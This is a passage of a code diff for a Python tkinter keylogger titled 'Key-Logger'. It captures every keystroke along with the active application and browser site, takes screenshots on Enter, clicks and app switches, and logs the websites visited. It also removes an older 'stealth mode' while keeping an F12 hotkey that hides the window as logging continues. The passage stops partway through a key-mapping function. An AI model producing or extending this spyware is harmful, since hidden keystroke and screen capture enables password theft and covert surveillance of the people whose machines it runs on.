-        self.folder_entry = tk.Entry(self.settings_frame, width=35)
-        self.folder_entry.insert(0, self.log_folder)
-        self.folder_entry.grid(row=1, column=1, padx=2)
-        self.all_entries.append(self.folder_entry)
-        self.folder_button = tk.Button(self.settings_frame, text="📁", command=lambda: self.dispatch("browse"), width=3)
-        self.folder_button.grid(row=1, column=2, padx=2)
-        self.all_buttons.append(self.folder_button)
-        adv_label = tk.Label(self.settings_frame, text="Advanced", font=(heading_font, 13, "bold"), bg=self.theme['panel'], fg=self.theme['accent'])
-        adv_label.grid(row=2, column=0, sticky="w", padx=2, pady=(10,3), columnspan=3)
-        log_interval_label = tk.Label(self.settings_frame, text="Log Interval (sec):", bg=self.theme['panel'], fg=self.theme['fg'])
-        log_interval_label.grid(row=3, column=0, sticky="w", padx=2)
-        self.log_interval_entry = tk.Entry(self.settings_frame, width=8)
-        self.log_interval_entry.insert(0, "30")
-        self.all_entries.append(self.log_interval_entry)
-        self.log_interval_entry.grid(row=3, column=1, sticky="w", padx=2)
-        hotkey_label = tk.Label(self.settings_frame, text="Hotkeys (e.g., f12):", bg=self.theme['panel'], fg=self.theme['fg'])
-        hotkey_label.grid(row=4, column=0, sticky="w", padx=2)
-        self.stealth_hotkey_entry = tk.Entry(self.settings_frame, width=8)
-        self.stealth_hotkey_entry.insert(0, self.hotkeys["stealth"])
-        self.all_entries.append(self.stealth_hotkey_entry)
-        self.stealth_hotkey_entry.grid(row=4, column=1, sticky="w", padx=2)
-        self.pause_hotkey_entry = tk.Entry(self.settings_frame, width=8)
-        self.pause_hotkey_entry.insert(0, self.hotkeys["pause"])
-        self.all_entries.append(self.pause_hotkey_entry)
-        self.pause_hotkey_entry.grid(row=4, column=2, sticky="w", padx=2)
-        self.save_settings_button = tk.Button(self.settings_frame, text="💾", command=lambda: self.dispatch("save_settings"), width=3)
-        self.save_settings_button.grid(row=5, column=0, pady=8)
-        self.all_buttons.append(self.save_settings_button)
-        self.status_label = tk.Label(self.root, text="Status: Idle", anchor="w", font=(heading_font, 11))
-        self.status_label.pack(side=tk.BOTTOM, fill=tk.X, pady=3)
-
-    def dispatch(self, action):
-        if action == "start": self.start_logging()
-        elif action == "stop": self.stop_logging()
-        elif action == "pause": self.pause_logging()
-        elif action == "stealth": self.toggle_stealth()
-        elif action == "search": self.search_logs()
-        elif action == "browse": self.browse_folder()
-        elif action == "save_settings": self.save_settings()
-        elif action == "screenshot": self.take_screenshot()
-
-    def setup_folders(self):
-        os.makedirs(self.log_folder, exist_ok=True)
-        os.makedirs(self.screenshot_folder, exist_ok=True)
-
-    def setup_encryption(self):
-        key_file = "encryption_key.key"
-        if os.path.exists(key_file):
-            with open(key_file, "rb") as f:
-                self.encryption_key = f.read()
-        else:
-            self.encryption_key = Fernet.generate_key()
-            with open(key_file, "wb") as f:
-                f.write(self.encryption_key)
-        self.cipher = Fernet(self.encryption_key)
-
-    def browse_folder(self):
-        folder = filedialog.askdirectory()
-        if folder:
-            self.folder_entry.delete(0, tk.END)
-            self.folder_entry.insert(0, folder)
-            self.log_folder = folder
-            self.sentence_logger.base_folder = folder
-            os.makedirs(self.log_folder, exist_ok=True)
-
-    def open_log_folder(self):
-        folder = os.path.abspath(self.log_folder)
-        if sys.platform == "win32":
-            os.startfile(folder)
-        elif sys.platform == "darwin":
-            subprocess.Popen(["open", folder])
-        else:
-            subprocess.Popen(["xdg-open", folder])
-
-    def save_settings(self):
-        self.log_folder = self.folder_entry.get() or "keylogs"
-        os.makedirs(self.log_folder, exist_ok=True)
-        self.sentence_logger.base_folder = self.log_folder
+    def setup_loggers_and_paths(self):
         try:
-            self.log_interval = int(self.log_interval_entry.get())
-        except ValueError:
-            self.log_interval = 30
-        self.hotkeys["stealth"] = self.stealth_hotkey_entry.get() or "f12"
-        self.hotkeys["pause"] = self.pause_hotkey_entry.get() or "f11"
-        self.restart_hotkey_listener()
-        messagebox.showinfo("Success", "Settings saved.")
+            key_stoker_path = self.root_log_dir / KEY_STOKER_DIR
+            
+            web_logs_path = key_stoker_path / WEB_LOGS_DIR
+            sys_apps_path = key_stoker_path / SYS_APPS_DIR
+            screenshots_path = key_stoker_path / SCREENSHOTS_DIR
 
-    def toggle_fullscreen(self):
-        is_fs = self.root.attributes("-fullscreen")
-        self.root.attributes("-fullscreen", not is_fs)
-        self.fullscreen_button.configure(text="⛶" if is_fs else "🗗")
+            web_logs_path.mkdir(parents=True, exist_ok=True)
+            sys_apps_path.mkdir(parents=True, exist_ok=True)
+            screenshots_path.mkdir(parents=True, exist_ok=True)
 
-    def minimize(self):
-        self.root.iconify()
+            self.screenshot_manager = ScreenshotManager(str(screenshots_path))
+            self.app_logger = AppLogger(str(web_logs_path), str(sys_apps_path))
+            self.usage_tracker = UsageTracker()
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to create folders: {e}")
+            self.stop_logging()
 
-    def toggle_halfscreen(self):
-        scr_w = self.root.winfo_screenwidth()
-        scr_h = self.root.winfo_screenheight()
-        width, height = scr_w // 2, scr_h // 2
-        self.root.geometry(f"{width}x{height}")
-
-    def start_hotkey_listener(self):
-        def on_hotkey(key):
+    def load_icons(self):
+        if ImageTk is None:
+            return
+        icon_files = {
+            'main': 'assets/main.png',
+            'start': 'assets/start.png',
+            'pause': 'assets/pause.png',
+            'stop': 'assets/stop.png',
+            'hide': 'assets/hide.png',
+            'search': 'assets/search.png',
+            'screenshot': 'assets/screenshot.png',
+            'folder': 'assets/folder.png'
+        }
+        for key, path in icon_files.items():
             try:
-                key_str = str(key).replace("Key.", "").lower()
-                if key_str == self.hotkeys["stealth"]:
-                    self.toggle_stealth()
-                elif key_str == self.hotkeys["pause"]:
-                    self.pause_logging()
+                full_path = resource_path(path)
+                if os.path.exists(full_path):
+                    img = Image.open(full_path)
+                    if key == 'main':
+                        img = img.resize((400, 190), Image.Resampling.LANCZOS)
+                    else:
+                        img = img. resize((52, 52), Image.Resampling.LANCZOS)
+                    self.icon_images[key] = ImageTk. PhotoImage(img)
             except Exception:
                 pass
-        self.hotkey_listener = keyboard.Listener(on_press=on_hotkey)
-        self.hotkey_listener.start()
+        try:
+            icon_path = resource_path('assets/app. ico')
+            if os.path.exists(icon_path):
+                self.root.iconbitmap(icon_path)
+        except Exception:
+            pass
 
-    def restart_hotkey_listener(self):
-        if self.hotkey_listener:
-            self.hotkey_listener.stop()
-        self.start_hotkey_listener()
+    def setup_gui(self):
+        self.root. title("𝒦𝑒𝓎-𝐿𝑜𝑔𝑔𝑒𝓇")
+        self.root.geometry("1920x1080")
+        self.root.state("zoomed")   # Windows fullscreen (taskbar ke saath)
+
+
+        ui_font = get_best_font(UI_FONTS, "Segoe UI", 9)
+        heading_font = get_best_font(UI_FONTS, "Segoe UI Semibold", 11)
+        log_font = get_best_font(LOG_FONTS, "Cascadia Mono", 9)
+
+
+
+        self.main_container = tk.Frame(self.root)
+        self.main_container.pack(fill=tk.BOTH, expand=True)
+
+        self.header_frame = tk.Frame(self.main_container)
+        self.header_frame. pack(side=tk.TOP, fill=tk.X, padx=25, pady=(20, 10))
+
+        if 'main' in self.icon_images:
+            logo_container = tk.Frame(self.header_frame)
+            logo_container.pack(side=tk.TOP)
+            self.logo_label = tk.Label(logo_container, image=self.icon_images['main'])
+            self.logo_label.pack()
+
+        title_status_frame = tk.Frame(self. header_frame)
+        title_status_frame.pack(side=tk.TOP, fill=tk. X, pady=(10, 0))
+
+        self.title_label = tk.Label(title_status_frame, text="ꜱᴛᴀᴛᴜꜱ", font=heading_font, anchor="w")
+        self.title_label.pack(side=tk. LEFT)
+
+        status_frame = tk.Frame(title_status_frame)
+        status_frame.pack(side=tk.LEFT, padx=20)
+
+        self.status_indicator = tk.Canvas(status_frame, width=16, height=16, highlightthickness=0)
+        self.status_indicator.pack(side=tk.LEFT, padx=(0, 8))
+        self.status_circle = self.status_indicator.create_oval(2, 2, 14, 14, fill="#6c757d", outline="")
+
+        self.status_label = tk.Label(status_frame, text="Idle", font=ui_font, anchor="w")
+        self.status_label.pack(side=tk.LEFT)
+
+        self.control_frame = tk.Frame(self.main_container)
+        self.control_frame.pack(side=tk.TOP, fill=tk.X, padx=25, pady=15)
+        
+        self.button_container = tk.Frame(self.control_frame)
+        self.button_container.pack(side=tk.TOP, anchor=tk.CENTER)
+
+        button_style = {'font': ui_font, 'relief': tk.FLAT, 'cursor': 'hand2', 'borderwidth': 0, 'highlightthickness': 0, 'padx': 16, 'pady': 10}
+
+        if 'start' in self.icon_images:
+            self.start_button = tk.Button(self.button_container, image=self.icon_images['start'], command=self.start_logging, **button_style)
+        else:
+            self.start_button = tk.Button(self.button_container, text="▶", command=self.start_logging, **button_style)
+        self.start_button.pack(side=tk.LEFT, padx=6)
+        self.create_tooltip(self.start_button, "Start Logging")
+
+        if 'pause' in self.icon_images:
+            self.pause_button = tk.Button(self.button_container, image=self.icon_images['pause'], command=self. pause_logging, state=tk.DISABLED, **button_style)
+        else:
+            self.pause_button = tk.Button(self.button_container, text="⏸", command=self.pause_logging, state=tk.DISABLED, **button_style)
+        self.pause_button.pack(side=tk.LEFT, padx=6)
+        self.create_tooltip(self.pause_button, "Pause Logging")
+
+        if 'stop' in self.icon_images:
+            self.stop_button = tk.Button(self.button_container, image=self. icon_images['stop'], command=self.stop_logging, state=tk.DISABLED, **button_style)
+        else:
+            self.stop_button = tk.Button(self.button_container, text="■", command=self.stop_logging, state=tk.DISABLED, **button_style)
+        self.stop_button.pack(side=tk.LEFT, padx=6)
+        self.create_tooltip(self.stop_button, "Stop Logging")
+
+        self.separator = tk.Frame(self.button_container, width=2, height=36)
+        self.separator.pack(side=tk.LEFT, padx=12)
+
+        if 'hide' in self.icon_images:
+            self.hide_button = tk.Button(self.button_container, image=self.icon_images['hide'], command=self.toggle_visibility, **button_style)
+        else:
+            self. hide_button = tk.Button(self.button_container, text="👁", command=self.toggle_visibility, **button_style)
+        self.hide_button.pack(side=tk.LEFT, padx=6)
+        self.create_tooltip(self.hide_button, "Hide Window (F12)")
+
+        if 'screenshot' in self.icon_images:
+            self.screenshot_button = tk.Button(self.button_container, image=self.icon_images. get('screenshot'), command=self.take_screenshot_manual, **button_style)
+        else:
+            self.screenshot_button = tk.Button(self.button_container, text="📸", command=self.take_screenshot_manual, **button_style)
+        self.screenshot_button.pack(side=tk.LEFT, padx=6)
+        self.create_tooltip(self. screenshot_button, "Take Screenshot")
+
+        if 'folder' in self.icon_images:
+            self.open_folder_button = tk.Button(self.button_container, image=self.icon_images. get('folder'), command=self.open_log_folder, **button_style)
+        else:
+            self. open_folder_button = tk. Button(self.button_container, text="📁", command=self.open_log_folder, **button_style)
+        self.open_folder_button.pack(side=tk.LEFT, padx=6)
+        self.create_tooltip(self. open_folder_button, "Open Log Folder")
+
+        self.content_frame = tk.Frame(self.main_container)
+        self.content_frame.pack(side=tk.TOP, fill=tk.BOTH, expand=True, padx=25, pady=10)
+
+        preview_header = tk.Frame(self.content_frame)
+        preview_header. pack(side=tk.TOP, fill=tk.X, pady=(0, 10))
+
+        self.preview_label = tk. Label(preview_header, text="ᴀᴄᴛɪᴠɪᴛʏ ᴘʀᴇᴠɪᴇᴡ", font=heading_font, anchor="w")
+        self.preview_label.pack(side=tk.LEFT)
+
+        self.preview_text = scrolledtext.ScrolledText(self.content_frame, font=log_font, wrap=tk.WORD, state=tk.DISABLED,
+                                                       relief=tk.FLAT, padx=12, pady=12, spacing1=2, spacing2=1, spacing3=2)
+        self.preview_text.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
+
+        self.preview_text.tag_config("system", foreground="#6c757d")
+        self.preview_text.tag_config("keyboard", foreground="#0d6efd")
+        self.preview_text.tag_config("web", foreground="#fd7e14")
+        self.preview_text.tag_config("timestamp", foreground="#6c757d", font=(log_font[0], 8))
+
+        self.search_frame = tk.Frame(self.content_frame)
+        self.search_frame.pack(side=tk.TOP, fill=tk.X, pady=(12, 0))
+
+        tk.Label(self.search_frame, text="Search:", font=ui_font).pack(side=tk.LEFT, padx=(0, 10))
+
+        self.search_entry = tk.Entry(self.search_frame, font=ui_font)
+        self.search_entry. pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
+        self.search_entry.bind('<Return>', lambda e: self.search_logs())
+
+        if 'search' in self.icon_images:
+            self.search_button = tk.Button(self.search_frame, image=self.icon_images['search'], command=self.search_logs,
+                                            relief=tk.FLAT, borderwidth=0, highlightthickness=0, cursor='hand2', padx=10, pady=6)
+        else:
+            self.search_button = tk.Button(self.search_frame, text="🔍", command=self.search_logs, font=ui_font,
+                                            relief=tk. FLAT, borderwidth=0, highlightthickness=0, cursor='hand2', padx=12, pady=6)
+        self.search_button.pack(side=tk.LEFT)
+
+        self.footer_frame = tk.Frame(self.main_container, height=35)
+        self.footer_frame.pack(side=tk. BOTTOM, fill=tk.X, padx=25, pady=(10, 20))
+
+        self.stats_label = tk.Label(self.footer_frame, text="Keys/min:  0 | Time: 0m", font=ui_font, anchor="w")
+        self.stats_label.pack(side=tk.LEFT, fill=tk.X, expand=True)
+
+    def create_tooltip(self, widget, text):
+        def on_enter(event):
+            tooltip = tk.Toplevel()
+            tooltip.wm_overrideredirect(True)
+            tooltip.wm_geometry(f"+{event.x_root+10}+{event.y_root+10}")
+            label = tk.Label(tooltip, text=text, background="#2d323e", foreground="#e4e6eb", relief=tk.FLAT, padx=8, pady=4, font=("Arial", 9))
+            label.pack()
+            widget.tooltip = tooltip
+
+        def on_leave(event):
+            if hasattr(widget, 'tooltip'):
+                widget.tooltip.destroy()
+                del widget.tooltip
+
+        widget.bind('<Enter>', on_enter)
+        widget.bind('<Leave>', on_leave)
+
+    def apply_theme(self):
+        theme = self.theme
+        self.root.configure(bg=theme["bg"])
+        self.main_container.configure(bg=theme["bg"])
+        self.header_frame.configure(bg=theme["bg"])
+        if hasattr(self, 'logo_label'):
+            self.logo_label.configure(bg=theme["bg"])
+            self.logo_label.master.configure(bg=theme["bg"])
+        self.title_label.configure(bg=theme["bg"], fg=theme["fg"])
+        self.status_label.configure(bg=theme["bg"], fg=theme["fg"])
+        self.control_frame.configure(bg=theme["bg"])
+        
+        if hasattr(self, 'button_container'):
+            self.button_container.configure(bg=theme["bg"])
+        if hasattr(self, 'separator'):
+            self.separator.configure(bg=theme["status_idle"])
+            
+        self.content_frame.configure(bg=theme["bg"])
+        self.preview_label.configure(bg=theme["bg"], fg=theme["fg"])
+        self.search_frame.configure(bg=theme["bg"])
+        self.footer_frame.configure(bg=theme["bg"])
+        self.stats_label.configure(bg=theme["bg"], fg=theme["fg"])
+        self.status_indicator.configure(bg=theme["bg"])
+        self.preview_text.configure(bg=theme["panel"], fg=theme["fg"], insertbackground=theme["accent"])
+        self.preview_text.tag_config("system", foreground=theme. get("system_color", theme["fg"]))
+        self.preview_text.tag_config("keyboard", foreground=theme.get("keyboard_color", theme["accent"]))
+        self.preview_text.tag_config("web", foreground=theme.get("web_color", theme["accent"]))
+        self.preview_text. tag_config("timestamp", foreground=theme.get("system_color", theme["fg"]))
+        
+        button_configs = {
+            'bg': theme["bg"], 
+            'fg': theme["button_fg"], 
+            'activebackground': theme["bg"], 
+            'activeforeground': theme["button_fg"],
+            'highlightthickness': 0,
+            'bd': 0
+        }
+        
+        for button in [self.start_button, self. pause_button, self.stop_button, self.hide_button, self.screenshot_button,
+                       self.open_folder_button, self.search_button]:
+            button.configure(**button_configs)
+            
+        entry_configs = {'bg': theme["entry_bg"], 'fg':  theme["entry_fg"], 'insertbackground': theme["accent"], 'relief': tk.FLAT}
+        self.search_entry.configure(**entry_configs)
+        for widget in self.search_frame.winfo_children():
+            if isinstance(widget, tk.Label):
+                widget.configure(bg=theme["bg"], fg=theme["fg"])
+
+    def update_status_indicator(self):
+        if self.is_logging and not self.is_paused:
+            color = self.theme["status_active"]
+            status_text = "Logging"
+        elif self.is_paused:
+            color = self.theme["status_paused"]
+            status_text = "Paused"
+        else:
+            color = self.theme["status_idle"]
+            status_text = "Idle"
+        self.status_indicator.itemconfig(self.status_circle, fill=color)
+        self.status_label.configure(text=status_text)
+
+    def start_background_tasks(self):
+        threading.Thread(target=self.buffer_flusher_task, daemon=True, name="BufferFlusher").start()
+        threading.Thread(target=self.idle_monitor_task, daemon=True, name="IdleMonitor").start()
+        threading.Thread(target=self.stats_updater_task, daemon=True, name="StatsUpdater").start()
+        threading.Thread(target=self.usage_saver_task, daemon=True, name="UsageSaver").start()
+
+    def buffer_flusher_task(self):
+        while not self.shutdown_event.is_set():
+            try:
+                if self.is_logging and not self.is_paused:
+                    if self.app_logger and self.app_logger.should_flush():
+                        self.app_logger.flush()
+            except Exception:
+                pass
+            self.shutdown_event.wait(1)
+
+    def idle_monitor_task(self):
+        while not self.shutdown_event.is_set():
+            try:
+                if self.is_logging and not self.is_paused:
+                    if self.idle_detector.check_idle():
+                        log_entry = "[SYSTEM] Idle detected"
+                        self.add_log_entry(log_entry, "system")
+            except Exception:
+                pass
+            self.shutdown_event.wait(5)
+
+    def stats_updater_task(self):
+        while not self.shutdown_event.is_set():
+            try:
+                if self.is_logging and not self.is_paused:
+                    kpm = self.session_stats.get_keys_per_minute()
+                    elapsed = time.time() - self.session_stats.start_time
+                    stats_text = f"Keys/min: {kpm:.0f} | Time: {elapsed / 60:.1f}m"
+                    self.queue_ui_update(lambda t=stats_text: self.stats_label.configure(text=t))
+            except Exception:
+                pass
+            self.shutdown_event.wait(2)
+
+    def usage_saver_task(self):
+        while not self.shutdown_event.is_set():
+            try:
+                if self.is_logging and self.usage_tracker:
+                    self.usage_tracker.save_usage()
+            except Exception:
+                pass
+            self.shutdown_event.wait(30)
+
+    def start_hotkey_listener(self):
+        def on_hotkey_press(key):
+            try:
+                key_str = str(key).replace("Key.", "").lower()
+                if key_str == "f12":
+                    self.queue_ui_update(self.toggle_visibility)
+                elif key_str == "f11":
+                    self.queue_ui_update(self.pause_logging)
+            except Exception:
+                pass
+        try:
+            self.hotkey_listener = keyboard.Listener(on_press=on_hotkey_press)
+            self.hotkey_listener.start()
+        except Exception:
+            pass
 
     def start_logging(self):
         if self.is_logging:
             return
+        
+        # NOTE: self.root_log_dir is already set in __init__
+        try:
+            self.root_log_dir.mkdir(parents=True, exist_ok=True)
+            self.setup_loggers_and_paths()
+        except Exception as e:
+            messagebox.showerror("Error", f"Could not create Stokes folder:\n{e}")
+            return
+
         self.is_logging = True
         self.is_paused = False
+        
+        self.current_process = None
+        self.current_site = None
+        self.current_window = None
+        self.unique_websites.clear() 
+        self.unknown_app_count = 0
+        self.system_apps_detected.clear()
+        
+        self.stop_event.clear()
+        self.session_stats = SessionStats()
         self.start_button.configure(state=tk.DISABLED)
-        self.stop_button.configure(state=tk.NORMAL)
-        self.pause_button.configure(state=tk.NORMAL)
-        self.status_label.configure(text="Status: Logging started...")
-        self.log_thread = threading.Thread(target=self.log_keys, daemon=True)
-        self.log_thread.start()
-        self.mouse_listener = mouse.Listener(on_click=self.on_mouse_click, on_scroll=self.on_mouse_scroll)
-        self.mouse_listener.start()
-        threading.Thread(target=self.auto_save_logs, daemon=True).start()
-        threading.Thread(target=self.clipboard_logger, daemon=True).start()
+        self.pause_button. configure(state=tk.NORMAL)
+        self.stop_button.configure(state=tk. NORMAL)
+        self.update_status_indicator()
+        threading.Thread(target=self.keyboard_logging_task, daemon=True, name="KeyboardLogger").start()
+        threading.Thread(target=self.mouse_logging_task, daemon=True, name="MouseLogger").start()
 
     def stop_logging(self):
+        if not self.is_logging:
+            return
         self.is_logging = False
         self.is_paused = False
+        self.stop_event.set()
+        self.commit_buffer()
+        if self.app_logger:
+            self.app_logger.flush()
+        if self.usage_tracker:
+            self.usage_tracker.save_usage()
+        if self.keyboard_listener:
+            try:
+                self.keyboard_listener.stop()
+            except Exception:
+                pass
+        if self. mouse_listener:
+            try: 
+                self.mouse_listener. stop()
+            except Exception: 
+                pass
+        
+        self.generate_session_summary()
+
         self.start_button.configure(state=tk.NORMAL)
-        self.stop_button.configure(state=tk.DISABLED)
         self.pause_button.configure(state=tk.DISABLED)
-        self.status_label.configure(text="Status: Logging stopped.")
-        self.sentence_logger.write_summaries()
-        self.save_log()
-        self.keys = []
-        if self.mouse_listener:
-            self.mouse_listener.stop()
+        self.stop_button.configure(state=tk.DISABLED)
+        self.update_status_indicator()
+
+    def generate_session_summary(self):
+        if not self.root_log_dir or not self.session_stats:
+            return
+
+        try:
+            summary_path = self.root_log_dir / "main_summary.txt"
+            end_time = datetime.datetime.now()
+            start_time = datetime.datetime.fromtimestamp(self.session_stats.start_time)
+            duration = end_time - start_time
+            
+            duration_minutes = duration.total_seconds() / 60.0
+            total_keys = self.session_stats.keystroke_count
+            avg_kpm = total_keys / duration_minutes if duration_minutes > 0 else 0
+
+            with open(summary_path, 'w', encoding='utf-8') as f:
+                f.write("========================================\n")
+                f.write("    ACTIVITY LOGGER - SESSION SUMMARY\n")
+                f.write("========================================\n\n")
+                
+                f.write(f"Start Time:       {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"End Time:         {end_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Total Duration:   {str(duration).split('.')[0]}\n\n")
+                
+                f.write("[STATS]\n")
+                f.write(f"Total Keystrokes:      {total_keys}\n")
+                f.write(f"Screenshot Count:      {self.screenshot_manager.screenshot_count if self.screenshot_manager else 0}\n")
+                f.write(f"System Apps Detected:  {len(self.system_apps_detected)}\n")
+                f.write(f"Unknown/Errors Count:  {self.unknown_app_count}\n\n")
+
+                f.write("[APPLICATIONS USED]\n")
+                if self.usage_tracker and self.usage_tracker.app_times:
+                    # Sort by duration descending
+                    sorted_apps = sorted(self.usage_tracker.app_times.items(), key=lambda x: x[1], reverse=True)
+                    for app, seconds in sorted_apps:
+                        m, s = divmod(seconds, 60)
+                        h, m = divmod(m, 60)
+                        time_str = f"{int(h)}h {int(m)}m {int(s)}s"
+                        f.write(f"- {app:<30} {time_str}\n")
+                else:
+                    f.write("- No application usage recorded.\n")
+                
+                f.write("\n[WEBSITES VISITED]\n")
+                if self.unique_websites:
+                    for site in sorted(self.unique_websites):
+                        f.write(f"- {site}\n")
+                else:
+                    f.write("- No websites recorded.\n")
+                
+                f.write("\n========================================\n")
+        except Exception as e:
+            print(f"Error generating summary: {e}")
 
     def pause_logging(self):
-        if self.is_logging and not self.is_paused:
-            self.is_paused = True
-            self.pause_button.configure(text="▶")
-            self.status_label.configure(text="Status: Logging paused.")
-        elif self.is_logging and self.is_paused:
-            self.is_paused = False
-            self.pause_button.configure(text="⏸")
-            self.status_label.configure(text="Status: Logging resumed.")
+        if not self.is_logging:
+            return
+        self.is_paused = not self.is_paused
+        self.update_status_indicator()
 
-    def toggle_stealth(self):
-        self.is_stealth = not self.is_stealth
-        if self.is_stealth:
+    def toggle_visibility(self):
+        self.is_hidden = not self. is_hidden
+        if self.is_hidden:
             self.root.withdraw()
-            self.stealth_button.configure(text="❌")
-            self.status_label.configure(text="Status: Stealth mode enabled.")
         else:
             self.root.deiconify()
-            self.stealth_button.configure(text="🕵️")
-            self.status_label.configure(text="Status: Stealth mode disabled.")
+            self.root.lift()
+            self.root.focus_force()
 
-    def log_keys(self):
-        def on_press(key):
+    def keyboard_logging_task(self):
+        def on_key_press(key):
             if not self.is_logging or self.is_paused:
                 return
             try:
-                timestamp = datetime.datetime.now()
-                app = get_active_window_title()
+                process_name, window_title = ProcessDetector.get_active_process_info()
+                
+                if process_name == "Unknown":
+                    self.unknown_app_count += 1
+                
+                if SystemAppDetector.is_system_app(process_name):
+                    self.system_apps_detected.add(process_name)
+
+                with self.context_lock:
+                    context_changed = False
+                    new_site = None
+                    
+                    if process_name != self.current_process:
+                        context_changed = True
+                    elif BrowserDetector.is_browser(process_name):
+                        new_site = BrowserDetector.extract_site_name(window_title)
+                        if new_site != self.current_site:
+                            context_changed = True
+                    elif window_title != self.current_window:
+                        context_changed = True
+                    
+                    if context_changed:
+                        self.commit_buffer_internal(self.current_process, self.current_site)
+                        self.current_process = process_name
+                        self.current_window = window_title
+                        if BrowserDetector.is_browser(process_name):
+                            self.current_site = new_site
+                        else:
+                            self.current_site = None
+                        self. handle_app_change(process_name, window_title)
+                
+                was_idle = self.idle_detector.activity()
+                if was_idle: 
+                    log_entry = "[SYSTEM] Activity resumed"
+                    self.add_log_entry(log_entry, "system")
+                
                 key_str = self.process_key(key)
-                self.sentence_logger.store_keystroke(key_str, app, timestamp)
-                if key_str not in ["[SHIFT]", "[CTRL_L]", "[CTRL_R]", "[ALT]", "[ALT_R]", "[CMD]", "[CMD_R]"]:
-                    preview_entry = f"[{timestamp.strftime('%H:%M:%S')}] [{app}] {key_str}"
-                    self.keys.append(preview_entry)
-                    self.update_preview(preview_entry)
-            except Exception as e:
-                self.keys.append(f"Error: {str(e)}")
-        with keyboard.Listener(on_press=on_press) as listener:
-            listener.join()
+                if key_str:
+                    self.session_stats.add_keystroke()
+                    
+                    if key_str in ["[SHIFT]", "[CTRL_L]", "[CTRL_R]", "[ALT]", "[ALT_R]", "[CMD]", "[CMD_R]", "[TAB]"]:
+                        return
+                    
+                    if key_str == "[BACKSPACE]":
+                        with self.context_lock:
+                            if self.keystroke_buffer:
+                                self.keystroke_buffer.pop()
+                        return
+                    
+                    if key_str == "[ENTER]":
+                        self.commit_buffer()
+                        with self.context_lock:
+                            current_proc = self.current_process
+                        if current_proc and self.screenshot_manager:
+                            threading.Thread(target=lambda: self.screenshot_manager.take_screenshot(current_proc, "enter"), daemon=True).start()
+                        return
+                    
+                    with self.context_lock:
+                        self.keystroke_buffer.append(key_str)
+                    
+                    log_entry = f"[{process_name}] {key_str}"
+                    self.add_log_entry(log_entry, "keyboard")
+            except Exception:
+                pass
+        
+        try:
+            self.keyboard_listener = keyboard. Listener(on_press=on_key_press)
+            self.keyboard_listener.start()
+            while not self.stop_event.is_set():
+                time.sleep(0.1)
+        except Exception:
+            pass
 
-    def on_mouse_click(self, x, y, button, pressed):
-        if not self.is_logging or self.is_paused or not pressed:
+    def mouse_logging_task(self):
+        def on_mouse_click(x, y, button, pressed):
+            if not self.is_logging or self.is_paused or not pressed:
+                return
+            try: 
+                self.idle_detector.activity()
+                if button == mouse.Button.left:
+                    self.commit_buffer()
+                    with self.context_lock:
+                        current_proc = self.current_process
+                    if current_proc and self.screenshot_manager:
+                        threading.Thread(target=lambda: self.screenshot_manager.take_screenshot(current_proc, "click"), daemon=True).start()
+            except Exception:
+                pass
+
+        def on_mouse_scroll(x, y, dx, dy):
+            if not self.is_logging or self.is_paused: 
+                return
+            try: 
+                self.idle_detector.activity()
+            except Exception:
+                pass
+        
+        try:
+            self.mouse_listener = mouse.Listener(on_click=on_mouse_click, on_scroll=on_mouse_scroll)
+            self.mouse_listener.start()
+            while not self.stop_event. is_set():
+                time. sleep(0.1)
+        except Exception:
+            pass
+
+    def handle_app_change(self, process_name:  str, window_title: str):
+        if self.usage_tracker:
+            self.usage_tracker.switch_app(process_name)
+        if self.screenshot_manager:
+            threading.Thread(target=lambda: self.screenshot_manager.take_screenshot(process_name, "appchange"), daemon=True).start()
+        
+        if BrowserDetector.is_browser(process_name):
+            site_name = BrowserDetector.extract_site_name(window_title)
+            if site_name: 
+                self.unique_websites.add(site_name)
+                log_entry = f"[WEB] {site_name}"
+                self.add_log_entry(log_entry, "web")
+
+    def commit_buffer_internal(self, process_name=None, site_name=None):
+        if not self.keystroke_buffer or not self.app_logger:
             return
-        timestamp = datetime.datetime.now()
-        app = get_active_window_title()
-        button_str = "Left" if button == mouse.Button.left else "Right"
-        log_entry = f"[{timestamp.strftime('%H:%M:%S')}] [{app}] [MOUSE_{button_str}]"
-        self.keys.append(log_entry)
-        self.update_preview(log_entry)
-        self.sentence_logger.store_keystroke(f"[MOUSE_{button_str}]", app, timestamp)
+        
+        target_process = process_name if process_name is not None else self.current_process
+        target_site = site_name if site_name is not None else self.current_site
 
-    def on_mouse_scroll(self, x, y, dx, dy):
-        if not self.is_logging or self.is_paused:
+        if not target_process:
+            self.keystroke_buffer.clear()
             return
-        timestamp = datetime.datetime.now()
-        app = get_active_window_title()
-        direction = "UP" if dy > 0 else "DOWN"
-        self.sentence_logger.log_scroll(direction, app, timestamp)
-        log_entry = f"[{timestamp.strftime('%H:%M:%S')}] [{app}] [SCROLL_{direction}]"
-        self.keys.append(log_entry)
-        self.update_preview(log_entry)
+        
+        buffer_text = ''.join(self. keystroke_buffer).replace("[SPACE]", " ").replace("[ENTER]", "\n").strip()
+        
+        if not buffer_text:
+            self.keystroke_buffer.clear()
+            return
+        
+        if BrowserDetector.is_browser(target_process) and target_site:
+            self.app_logger.log_browser_visit(target_process, target_site, buffer_text)
+        elif SystemAppDetector.is_system_app(target_process):
+            self.app_logger.log_system_app(target_process, buffer_text)
+        else:
+            self.app_logger.log_keyboard(target_process, buffer_text)
+        
+        self. keystroke_buffer.clear()
 
-    def process_key(self, key):
+    def commit_buffer(self):
+        with self.context_lock:
+            self.commit_buffer_internal(self.current_process, self.current_site)
+
+    def process_key(self, key) -> Optional[str]:
         try:
             if hasattr(key, "char") and key.char:
                 return key.char
-            else:
-                key_str = str(key).replace("Key.", "").upper()
-                if key_str == "SPACE":
-                    return "[SPACE]"
-                elif key_str == "ENTER":
-                    return "[ENTER]"
-                elif key_str == "BACKSPACE":
-                    return "[BACKSPACE]"
-                elif key_str == "TAB":
-                    return "[TAB]"
-                elif key_str in ["CTRL_L", "CTRL_R"]:
-                    return f"[{key_str}]"
-                elif key_str in ["SHIFT", "SHIFT_R", "ALT", "ALT_R", "CMD", "CMD_R"]:
-                    return f"[{key_str}]"
+            
+            key_str = str(key).replace("Key.", "").upper()
+            
+            key_map = {
+                "SPACE":  "[SPACE]",
+                "ENTER": "[ENTER]",
